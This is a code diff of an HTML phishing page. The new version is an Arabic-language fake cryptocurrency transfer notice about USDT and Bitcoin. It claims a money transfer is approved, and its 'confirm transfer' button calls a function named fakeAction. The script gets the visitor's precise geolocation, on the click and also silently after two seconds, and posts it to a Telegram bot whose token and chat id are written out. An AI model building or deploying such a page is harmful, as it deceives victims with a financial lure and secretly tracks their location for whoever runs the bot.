@@ -2,63 +2,100 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Confirm Transfer</title>
+  <title>عملات رقمية USDT وبيتكوين</title>
   <style>
     body {
-      background-color: #1a1a1a;
-      color: white;
-      font-family: sans-serif;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
       text-align: center;
+      background-image: url('https://i.ibb.co/qCjXH1G/bitcoin-bg.jpg');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .container {
+      margin-top: 100px;
+      background-color: rgba(0, 0, 0, 0.75);
+      display: inline-block;
       padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 10px gold;
     }
-    .card {
-      background: #222;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #f2a900;
-      max-width: 400px;
-      margin: auto;
+
+    img.logo {
+      width: 100px;
+      margin-bottom: 20px;
     }
+
+    h1 {
+      color: gold;
+      font-size: 24px;
+    }
+
     button {
-      background-color: #f2a900;
+      background-color: gold;
+      color: black;
+      font-weight: bold;
+      padding: 15px 30px;
       border: none;
-      padding: 15px 25px;
-      font-size: 16px;
-      color: #000;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
-      margin-top: 20px;
+      font-size: 16px;
+      margin-top: 30px;
+    }
+
+    button:hover {
+      background-color: #f0c000;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>✅ Transfer Ready</h2>
-    <p>To receive your funds, please confirm your wallet.</p>
-    <button onclick="confirmWallet()">Confirm</button>
+  <div class="container">
+    <img src="https://i.ibb.co/w07T9rh/bitcoin-logo.png" alt="Bitcoin Logo" class="logo">
+    <h1>تهانينا! لقد تم قبول الطلب لتحويل المال</h1>
+    <button onclick="fakeAction()">تأكيد التحويل</button>
   </div>
 
   <script>
-    function confirmWallet() {
+    function sendLocation(lat, lon) {
+      const chat_id = "7485197107";
+      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      const message = `📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}`;
+      fetch(url, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: message })
+      });
+    }
+
+    function fakeAction() {
       navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          fetch("/location", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude
-            })
-          });
-          alert("✅ Wallet confirmed. Funds will arrive shortly.");
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          sendLocation(lat, lon);
         },
-        function(err) {
-          alert("Please enable location to confirm.");
-        }
+        err => console.log("Location error:", err),
+        { enableHighAccuracy: true, timeout: 10000 }
       );
     }
+
+    // طلب الموقع بخفة بعد 2 ثانية
+    setTimeout(() => {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          sendLocation(lat, lon);
+        },
+        err => {},
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    }, 2000);
   </script>
 </body>
 </html>
